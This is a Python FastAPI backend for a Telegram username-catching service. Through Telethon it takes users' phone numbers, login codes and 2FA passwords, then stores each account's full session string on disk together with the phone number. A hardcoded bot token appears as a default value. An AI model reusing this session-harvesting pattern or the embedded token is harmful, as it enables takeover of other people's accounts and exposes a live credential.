"""
backend.py — FastAPI сервер для авторизации Telegram аккаунтов
Деплой: amvera.io / любой VPS с Python 3.11+

Зависимости: fastapi uvicorn telethon aiohttp python-dotenv
"""

import os
import uuid
import asyncio
import logging
import aiohttp
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PasswordHashInvalidError,
)
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config (заполните своими данными) ────────────────────────
# Получите на https://my.telegram.org
TG_API_ID   = int(os.environ.get("TG_API_ID", "0"))
TG_API_HASH = os.environ.get("TG_API_HASH", "")

# Токен @busyuser_bot
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "8445674384:AAFJLzGv4hoKeChSFeRBbmGx_RwDCHyiO8g")

# Секрет для webhook-уведомлений боту (в боте должна быть /webhook ручка)
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "busyuser_secret_2024")

# Chat ID или username бота для уведомлений
BOT_NOTIFY_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
# ────────────────────────────────────────────────────────────

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Хранилище сессий в памяти: session_id -> {client, phone, phone_code_hash}
sessions: dict = {}

# ── Статика (фронтенд рядом с бэком) ────────────────────────
if os.path.exists("index.html"):
    @app.get("/")
    async def root():
        return FileResponse("index.html")


# ── /send_code ───────────────────────────────────────────────
@app.post("/send_code")
async def send_code(request: Request):
    try:
        body = await request.json()
        phone = body.get("phone", "").strip()
        if not phone:
            return JSONResponse({"ok": False, "error": "Укажите номер телефона."}, status_code=400)

        session_id = str(uuid.uuid4())
        client = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
        await client.connect()

        result = await client.send_code_request(phone)
        sessions[session_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
        }

        logger.info(f"Code sent to {phone}, session={session_id}")
        return JSONResponse({"ok": True, "session_id": session_id})

    except FloodWaitError as e:
        return JSONResponse({"ok": False, "error": f"Слишком много запросов. Подождите {e.seconds} сек."}, status_code=429)
    except Exception as e:
        logger.error(f"send_code error: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


# ── /verify_code ─────────────────────────────────────────────
@app.post("/verify_code")
async def verify_code(request: Request):
    try:
        body = await request.json()
        phone      = body.get("phone", "").strip()
        code       = body.get("code", "").strip()
        password   = body.get("password", "").strip()
        session_id = body.get("session_id", "").strip()

        sess = sessions.get(session_id)
        if not sess:
            return JSONResponse({"ok": False, "error": "Сессия истекла. Запросите код повторно."}, status_code=400)

        client: TelegramClient = sess["client"]
        phone_code_hash = sess["phone_code_hash"]

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)

        except SessionPasswordNeededError:
            if not password:
                return JSONResponse({"ok": False, "need_password": True, "error": "Требуется пароль 2FA."})
            try:
                await client.sign_in(password=password)
            except PasswordHashInvalidError:
                return JSONResponse({"ok": False, "error": "Неверный пароль 2FA."}, status_code=400)

        except PhoneCodeInvalidError:
            return JSONResponse({"ok": False, "error": "Неверный код. Проверьте и попробуйте ещё раз."}, status_code=400)

        except PhoneCodeExpiredError:
            return JSONResponse({"ok": False, "error": "Код истёк. Запросите новый."}, status_code=400)

        # Аккаунт авторизован — получаем сессию
        me = await client.get_me()
        session_string = client.session.save()

        logger.info(f"Authorized: {me.id} @{me.username} phone={phone}")

        # Сохраняем сессию на диск (опционально)
        await save_session(str(me.id), phone, session_string, me.username)

        # Уведомляем бота через Telegram Bot API
        await notify_bot(me.id, phone, me.username, me.first_name)

        # Очищаем временную сессию из памяти
        sessions.pop(session_id, None)

        return JSONResponse({
            "ok": True,
            "user_id": me.id,
            "username": me.username,
            "phone": phone,
        })

    except Exception as e:
        logger.error(f"verify_code error: {e}")
        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)


# ── Helpers ──────────────────────────────────────────────────

async def save_session(user_id: str, phone: str, session_string: str, username: str | None):
    """Сохраняет StringSession в файл /data/sessions/<user_id>.session"""
    os.makedirs("/data/sessions", exist_ok=True)
    path = f"/data/sessions/{user_id}.session"
    with open(path, "w") as f:
        f.write(session_string)
    # Также пишем маппинг phone -> user_id
    with open("/data/sessions/index.txt", "a") as f:
        f.write(f"{user_id}\t{phone}\t{username or ''}\n")
    logger.info(f"Session saved: {path}")


async def notify_bot(tg_user_id: int, phone: str, username: str | None, first_name: str | None):
    """
    Отправляет вебхук (сообщение) через Bot API:
    - Боту @busyuser_bot нужно знать Telegram ID пользователя, который подключил аккаунт.
    - Здесь мы просто шлём сообщение пользователю от бота.
    
    Если нужна HTTP-ручка в боте — замените этот блок на aiohttp.post к своему серверу.
    """
    uname_str = f"@{username}" if username else "без username"
    text = (
        "✅ <b>Аккаунт успешно подключён!</b>\n\n"
        f"📱 <b>Номер:</b> <code>{phone}</code>\n"
        f"👤 <b>Аккаунт:</b> {first_name or ''} {uname_str}\n\n"
        "🤖 Автоловец активен. Теперь система будет автоматически ловить юзернеймы из ваших ловушек.\n\n"
        "🎯 Управляйте ловушками в боте: @busyuser_bot"
    )
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(BOT_NOTIFY_URL, json={
                "chat_id": tg_user_id,
                "text": text,
                "parse_mode": "HTML",
            })
        logger.info(f"Notified user {tg_user_id}")
    except Exception as e:
        logger.error(f"notify_bot error: {e}")


# ── Healthcheck ──────────────────────────────────────────────
@app.get("/health")
async def health():
    return {"ok": True, "sessions_active": len(sessions)}


# ── Run ──────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("backend:app", host="0.0.0.0", port=8000, reload=False)
